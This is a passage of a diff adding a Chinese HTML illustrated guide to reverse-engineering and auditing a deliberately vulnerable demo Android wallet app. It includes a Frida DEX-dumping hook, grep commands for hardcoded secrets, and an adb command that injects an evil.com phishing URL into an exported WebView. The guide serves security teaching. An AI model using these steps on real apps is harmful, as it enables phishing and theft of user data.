+        <line x1="26" y1="76" x2="12" y2="84" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="80" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <path d="M84 80 L96 74 L98 80 L86 88 Z" fill="none" stroke="#ff6b6b" stroke-width="3"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">验甲师</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ff6b6b">1d</div>
+      <div class="step-name">加固检测</div>
+    </div>
+    <div class="card c1">
+      <h2>🛡️ 加固检测 <span class="en">Packer Detection</span> <span class="parent-tag">① 侦察</span></h2>
+      <div class="desc">判断有没有壳，直接决定后续路线：<strong>无壳 → 直接反编译</strong>；<strong>有壳 → 走运行时脱壳</strong>。硬刚加固壳的静态分析 = 纯浪费时间。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>lib/ 目录 + Application 类名</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>加固方案判定 / 路线决策</div>
+      </div>
+      <div class="code"><span class="lbl">特征对照表</span>
+libjiagu.so              → <span class="p">360 加固</span>
+libDexHelper.so          → <span class="p">梆梆加固</span>
+libshellx-&lt;版本&gt;.so      → <span class="p">腾讯乐固</span>
+libshella-&lt;版本&gt;.so      → <span class="p">腾讯乐固（另一命名）</span>
+libmobisec.so            → <span class="p">阿里聚安全</span>
+<span class="i">stub App</span> 类名         → 壳的入口，原 Application 被藏在别处
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">比对本样本的 lib/ 目录</span> ⬇️</div>
+      <div class="code"><span class="lbl">$ ls lib/arm64-v8a/</span>
+<span class="r">libnative-lib.so</span>   <span class="c">← 只有业务 so，无壳</span>
+<span class="r">✓ 判定：无加固，直接进入反编译阶段</span>
+</div>
+      <div class="tips">
+        <span class="tip info">三板斧：so 文件名 / Application 类名 / DEX 头部 magic</span>
+        <span class="tip warn">有壳还硬做静态 = 只能看到加载器，看不到业务逻辑</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==================== PHASE 2 ==================== -->
+  <div class="phase-divider left">
+    <div class="phase-banner p2">
+      <div class="phase-title">⚙️ ② 脱壳与反编译 Unpack &amp; Decompile</div>
+      <div class="cmd">$ jadx -d java/ demo-wallet.apk</div>
+    </div>
+  </div>
+
+  <!-- 2a -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b2">拆开看看零件</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#4d96ff" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#4d96ff"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#4d96ff"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#4d96ff" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#4d96ff" font-family="monospace">UNZIP</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="84" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <rect x="82" y="76" width="16" height="20" rx="2" fill="none" stroke="#4d96ff" stroke-width="3"/>
+        <line x1="82" y1="82" x2="98" y2="82" stroke="#4d96ff" stroke-width="2"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">拆包工</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#4d96ff">2a</div>
+      <div class="step-name">解包</div>
+    </div>
+    <div class="card c2">
+      <h2>📂 解包 <span class="en">Unzip</span> <span class="parent-tag">② 反编译</span></h2>
+      <div class="desc">APK 本质就是个 ZIP。解开后<strong>五类资产</strong>一览无遗：dex（代码）、arsc（资源索引）、res（资源）、lib（Native）、META-INF（签名）。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>demo-wallet.apk</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>dex / arsc / so / 签名 目录树</div>
+      </div>
+      <div class="code"><span class="lbl">解包前</span>
+demo-wallet.apk                    <span class="c">← 单个 ZIP 容器</span>
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">$ unzip -o demo-wallet.apk -d raw/</span> ⬇️</div>
+      <div class="code"><span class="lbl">解包后 raw/</span>
+├── <span class="r">classes.dex</span>          <span class="n">2.1 MB</span>  <span class="c">← 全部业务逻辑</span>
+├── resources.arsc       <span class="n">892 KB</span>  <span class="c">← 资源索引表</span>
+├── AndroidManifest.xml          <span class="c">← 二进制 AXML</span>
+├── res/                         <span class="c">← 图片 / 布局 / 字符串</span>
+├── lib/arm64-v8a/<span class="r">libnative-lib.so</span>
+└── META-INF/
+       CERT.RSA  CERT.SF  MANIFEST.MF   <span class="c">← 签名三件套</span>
+</div>
+      <div class="tips">
+        <span class="tip info">出现 classes2.dex/classes3.dex 说明方法数超 65536（multidex）</span>
+        <span class="tip warn">META-INF 是签名凭据——改任何文件都必须重新签名</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2b -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b2">你藏内存里我也能捞出来</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#4d96ff" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#4d96ff"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#4d96ff"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#4d96ff" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#4d96ff" font-family="monospace">DUMP</text>
+        <line x1="26" y1="76" x2="12" y2="86" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="80" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <path d="M84 78 L98 72 L100 78 L86 86 Z" fill="none" stroke="#4d96ff" stroke-width="3"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">捞取员</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#4d96ff">2b</div>
+      <div class="step-name">脱壳</div>
+    </div>
+    <div class="card c2">
+      <h2>🔓 脱壳 Dump <span class="en">Dex Unpacking</span> <span class="parent-tag">② 反编译</span></h2>
+      <div class="desc">加了壳的 APK，zip 里的类只是<strong>加载器</strong>，真正的 dex 在运行时才解密进内存。<strong>要拿真身，就得在它跑起来的那一刻动手</strong>。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>运行中的加固 App</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>解密后的真实 classes.dex</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">运行时拦截 DexFile 加载</span> ⬇️</div>
+      <div class="code"><span class="lbl">hook_dexdump.js</span>
+<span class="t">Java</span>.<span class="f">perform</span>(<span class="k">function</span> () {
+  <span class="k">var</span> DexFile = <span class="t">Java</span>.<span class="f">use</span>(<span class="s">"dalvik.system.DexFile"</span>);
+  <span class="k">var</span> origInit = DexFile.<span class="f">$init</span>.<span class="f">overload</span>(<span class="s">'java.lang.String'</span>);   <span class="c">// ① 先保存原方法</span>
+  origInit.<span class="f">implementation</span> = <span class="k">function</span> (path) {
+      <span class="k">var</span> ret = origInit.<span class="f">call</span>(<span class="k">this</span>, path);   <span class="c">// ② 调原方法，不会递归</span>
+      <span class="f">console</span>.<span class="f">log</span>(<span class="s">"[+] DexFile loaded: "</span> + path);
+      <span class="f">dumpDexFromMemory</span>(path);   <span class="c">// 从内存抠出明文 dex</span>
+      <span class="k">return</span> ret;
+  };
+});
+<span class="c">// $ frida -U -f com.vuln.wallet -l hook_dexdump.js</span>
+</div>
+      <div class="tips">
+        <span class="tip info">主流工具：frida-dexdump / FART / youpk / BlackDex</span>
+        <span class="tip warn">抽取壳需主动调用触发方法，否则 dump 出来的 dex 指令是空的</span>
+        <span class="tip warn">本样本无壳，此步可跳过 —— 但真实对抗中这是最耗时的一环</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2c -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b2">2.1 MB 的 dex，变成能读的 Java 了</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#4d96ff" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#4d96ff"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#4d96ff"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#4d96ff" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#4d96ff" font-family="monospace">JADX</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="86" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <path d="M84 82 L98 82 L98 92 L84 92 Z" fill="none" stroke="#4d96ff" stroke-width="3"/>
+        <line x1="87" y1="87" x2="95" y2="87" stroke="#4d96ff" stroke-width="2"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">翻译官</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#4d96ff">2c</div>
+      <div class="step-name">DEX 反编译</div>
+    </div>
+    <div class="card c2">
+      <h2>☕ DEX 反编译 <span class="en">Decompile to Java</span> <span class="parent-tag">② 反编译</span></h2>
+      <div class="desc">把 dex 字节码还原成<strong>近乎可读的 Java 源码</strong>。这是整条链路的信息密度峰值——从这里开始，攻击者读代码和读自己的项目没区别。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>classes.dex</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>可搜索、可跳转的 Java 源码树</div>
+      </div>
+      <div class="code"><span class="lbl">反编译前</span>
+$ jadx -d java/ demo-wallet.apk
+<span class="c"># 或 jadx-gui demo-wallet.apk —— 图形界面，支持全局搜索</span>
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">DEX 字节码 → 近似 Java 源码</span> ⬇️</div>
+      <div class="code"><span class="lbl">反编译后 java/sources/com/vuln/wallet/</span>
+├── ui/<span class="r">LoginActivity.java</span>      <span class="c">← 登录逻辑</span>
+├── ui/<span class="r">WebActivity.java</span>        <span class="c">← exported 组件</span>
+├── net/<span class="r">ApiClient.java</span>          <span class="c">← 接口定义</span>
+└── util/<span class="r">CryptoUtil.java</span>        <span class="c">← 加密实现</span>
+</div>
+      <div class="tips">
+        <span class="tip info">jadx 反编译失败的方法，用 baksmali 看 smali 兜底</span>
+        <span class="tip warn">混淆后类名是 a/b/c.java —— 靠字符串常量 + 调用图还原语义</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2d -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b2">C 写的也别想跑</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#4d96ff" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#4d96ff"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#4d96ff"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#4d96ff" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#4d96ff" font-family="monospace">SO</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="90" y2="78" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <rect x="84" y="70" width="6" height="22" rx="2" fill="#4d96ff"/>
+        <rect x="92" y="70" width="6" height="22" rx="2" fill="#4d96ff"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">Native 工</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#4d96ff">2d</div>
+      <div class="step-name">Native 逆向</div>
+    </div>
+    <div class="card c2">
+      <h2>🧬 Native 逆向 <span class="en">Reverse the .so</span> <span class="parent-tag">② 反编译</span></h2>
+      <div class="desc">关键算法常常沉到 <code>.so</code> 里躲避 Java 层审计。用 IDA / Ghidra 找 <strong>JNI 导出函数</strong>，还原加密算法与密钥派生过程。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>libnative-lib.so</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>JNI 函数表 / 算法实现 / 密钥来源</div>
+      </div>
+      <div class="code"><span class="lbl">① 定位导出符号</span>
+$ nm -D lib/arm64-v8a/libnative-lib.so | grep Java_
+<span class="r">Java_com_vuln_wallet_util_CryptoUtil_encrypt</span>
+<span class="r">Java_com_vuln_wallet_util_CryptoUtil_getKey</span>
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">IDA / Ghidra 跟进 getKey</span> ⬇️</div>
+      <div class="code"><span class="lbl">② 反编译结果</span>
+<span class="t">jstring</span> <span class="f">getKey</span>(JNIEnv *env, jobject thiz) {
+    <span class="k">return</span> <span class="f">NewStringUTF</span>(env, <span class="s">"1234567890abcdef"</span>);  <span class="e">← 密钥裸奔</span>
+}
+</div>
+      <div class="tips">
+        <span class="tip info">函数名被 strip 时，去 <code>JNI_OnLoad</code> 里找 RegisterNatives 的函数表</span>
+        <span class="tip warn">OLLVM 混淆的 so，控制流平坦化需要专门的脱混淆工具</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2e -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b2">资源也翻译成人话了</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#4d96ff" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#4d96ff"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#4d96ff"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#4d96ff" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#4d96ff" font-family="monospace">RES</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="82" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <rect x="83" y="78" width="15" height="14" rx="2" fill="none" stroke="#4d96ff" stroke-width="3"/>
+        <line x1="86" y1="83" x2="95" y2="83" stroke="#4d96ff" stroke-width="2"/>
+        <line x1="86" y1="87" x2="95" y2="87" stroke="#4d96ff" stroke-width="2"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">资源匠</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#4d96ff">2e</div>
+      <div class="step-name">资源还原</div>
+    </div>
+    <div class="card c2">
+      <h2>🧰 资源还原 <span class="en">Resource Decode</span> <span class="parent-tag">② 反编译</span></h2>
+      <div class="desc">把二进制 AXML 还原成明文 XML，同时生成 <strong>smali 目录</strong>——这是后面重打包注入的"手术台"。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>二进制 AXML + resources.arsc</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>明文 manifest + 资源 + 可编辑 smali</div>
+      </div>
+      <div class="code"><span class="lbl">还原前</span>
+AndroidManifest.xml       <span class="c">← 二进制 AXML，不可读</span>
+resources.arsc            <span class="c">← 资源索引，ID 混淆</span>
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">$ apktool d -f demo-wallet.apk -o decoded/</span> ⬇️</div>
+      <div class="code"><span class="lbl">还原后 decoded/</span>
+├── <span class="r">AndroidManifest.xml</span>   <span class="c">← 变成可读明文了</span>
+├── res/values/strings.xml
+├── res/xml/network_security_config.xml
+└── <span class="r">smali/</span>                 <span class="c">← 可改、可回编译</span>
+     └── com/vuln/wallet/ui/LoginActivity.smali
+</div>
+      <div class="tips">
+        <span class="tip info">apktool 的 smali 目录 = 重打包注入的入口（见阶段 ⑥）</span>
+        <span class="tip warn">部分厂商对资源做混淆，需用 aapt2 dump 交叉比对</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==================== PHASE 3 ==================== -->
+  <div class="phase-divider right">
+    <div class="phase-banner p3">
+      <div class="phase-title">🔎 ③ 代码审计 Code Audit</div>
+      <div class="cmd">$ grep -rn "AES\|password\|token\|exported" java/sources/</div>
+    </div>
+  </div>
+
+  <!-- 3a -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b3">钥匙就挂在门把手上</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ff922b" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ff922b"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ff922b"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ff922b" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="11" font-weight="900" fill="#ff922b" font-family="monospace">KEY</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="86" y2="84" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <circle cx="88" cy="86" r="5" fill="none" stroke="#ff922b" stroke-width="3"/>
+        <line x1="92" y1="90" x2="98" y2="96" stroke="#ff922b" stroke-width="3" stroke-linecap="round"/>
+        <line x1="96" y1="92" x2="99" y2="89" stroke="#ff922b" stroke-width="2.5" stroke-linecap="round"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">搜钥人</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ff922b">3a</div>
+      <div class="step-name">密钥搜捕</div>
+    </div>
+    <div class="card c3">
+      <h2>🔑 密钥与凭据搜捕 <span class="en">Secret Hunt</span> <span class="parent-tag">③ 审计</span></h2>
+      <div class="desc">代码里翻"藏起来的钥匙"。硬编码的 AES 密钥、测试账号、后端地址——<strong>拿到密钥就能离线解密所有本地密文</strong>，这一步直接决定后面能走多远。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>反编译源码 + strings</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>硬编码密钥 / 测试凭据 / 后端地址</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">全库正则匹配密钥特征</span> ⬇️</div>
+      <div class="code"><span class="lbl">$ grep -rn "KEY\|SECRET\|password" java/sources/</span>
+<span class="i">CryptoUtil.java</span>:<span class="n">14</span>: <span class="k">private static final</span> String AES_KEY = <span class="e">"1234567890abcdef"</span>;
+<span class="i">ApiClient.java</span>:<span class="n">22</span>:  String token = <span class="e">"test-admin-2023"</span>;
+<span class="i">BuildConfig.java</span>:<span class="n">8</span>:  String BASE_URL = <span class="s">"http://api.vuln.internal:8080"</span>;
+<span class="i">Config.java</span>:<span class="n">31</span>:   String SIGN_SALT = <span class="e">"S3cr3t_S@lt"</span>;
+</div>
+      <div class="tips">
+        <span class="tip warn">拿到 AES_KEY → 本地数据库 / 缓存文件全部可离线解密</span>
+        <span class="tip info">测试 token 经常在生产环境仍然有效（没下线）</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3b -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b3">谁都能喊我开门，那我就开</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ff922b" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ff922b"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ff922b"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ff922b" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="10" font-weight="900" fill="#ff922b" font-family="monospace">COMP</text>
+        <line x1="26" y1="76" x2="12" y2="86" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="84" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <path d="M86 84 L92 74 L98 78 L92 88 Z" fill="none" stroke="#ff922b" stroke-width="3"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">组件审</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ff922b">3b</div>
+      <div class="step-name">组件审计</div>
+    </div>
+    <div class="card c3">
+      <h2>🚪 组件安全审计 <span class="en">Component Audit</span> <span class="parent-tag">③ 审计</span></h2>
+      <div class="desc">把 1b 找出来的 exported 组件，逐个看代码里<strong>有没有做校验</strong>。Android 四大组件是跨进程攻击面，没有权限保护 = 任意 App 可以调用。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>exported 组件列表 + 源码</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>越权调用路径 / Intent 注入点</div>
+      </div>
+      <div class="code"><span class="lbl">① 审计发现：零校验</span>
+<span class="k">public class</span> <span class="t">WebActivity</span> <span class="k">extends</span> <span class="t">Activity</span> {
+  <span class="k">protected void</span> <span class="f">onCreate</span>(Bundle b) {
+    <span class="t">Uri</span> uri = <span class="f">getIntent</span>().<span class="f">getData</span>();
+    <span class="t">String</span> url = uri.<span class="f">getQueryParameter</span>(<span class="s">"url"</span>);
+    webView.<span class="f">loadUrl</span>(url);        <span class="e">← 零校验，任意 URL</span>
+  }
+}
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">从外部 App 构造 Intent 唤起</span> ⬇️</div>
+      <div class="code"><span class="lbl">② 攻击者利用</span>
+$ adb shell am start -a android.intent.action.VIEW \
+    -d <span class="e">"vulnwallet://web?url=http://evil.com/phish.html"</span>
+<span class="c"># 正版 App 弹出自己的 WebView 加载钓鱼页 —— 用户无法分辨</span>
+</div>
+      <div class="tips">
+        <span class="tip warn">任意 App 可唤起 + 传入恶意 URL → 应用内钓鱼、窃取 Cookie</span>
+        <span class="tip info">同时检查 PendingIntent 是否带 FLAG_IMMUTABLE（否则可被劫持）</span>
+        <span class="tip info">ContentProvider 的 <code>grantUriPermissions</code> / path 穿越也是重灾区</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3c -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b3">这个加密，等于没加密</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ff922b" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ff922b"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ff922b"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ff922b" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="9" font-weight="900" fill="#ff922b" font-family="monospace">CRYPTO</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="84" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <circle cx="92" cy="87" r="6" fill="none" stroke="#ff922b" stroke-width="3"/>
+        <line x1="92" y1="78" x2="92" y2="81" stroke="#ff922b" stroke-width="2.5"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">密码匠</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ff922b">3c</div>
+      <div class="step-name">加密审计</div>
+    </div>
+    <div class="card c3">
+      <h2>🔐 加解密审计 <span class="en">Crypto Audit</span> <span class="parent-tag">③ 审计</span></h2>
+      <div class="desc">加密实现错了，比不加密更危险——因为它给人虚假的安全感。<strong>ECB 模式、固定 IV、弱随机数</strong>是三大经典死穴。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>CryptoUtil / 所有 Cipher 调用</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>算法缺陷清单 + 可预测性证明</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">逐行检查 Cipher 调用</span> ⬇️</div>
+      <div class="code"><span class="lbl">CryptoUtil.java</span>
+<span class="t">Cipher</span> c = <span class="t">Cipher</span>.<span class="f">getInstance</span>(<span class="e">"AES/ECB/PKCS5Padding"</span>);  <span class="c">← ECB 模式</span>
+c.<span class="f">init</span>(<span class="t">Cipher</span>.ENCRYPT_MODE,
+       <span class="k">new</span> <span class="t">SecretKeySpec</span>(AES_KEY.<span class="f">getBytes</span>(), <span class="s">"AES"</span>));
+<span class="c">// 无 IV，无加盐，无 HMAC —— 密文可被篡改而不被发现</span>
+<span class="t">byte</span>[] out = c.<span class="f">doFinal</span>(plain.<span class="f">getBytes</span>());
+
+<span class="c">// 还发现：</span>
+<span class="k">new</span> <span class="t">Random</span>().<span class="f">nextInt</span>()   <span class="e">← 应为 SecureRandom，可预测</span>
+</div>
+      <div class="tips">
+        <span class="tip warn">ECB 相同明文 → 相同密文，可直接做字典比对攻击</span>
+        <span class="tip info">缺 HMAC = 可做 padding oracle / 密文篡改</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3d -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b3">网页说啥它就干啥</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ff922b" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ff922b"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ff922b"/>
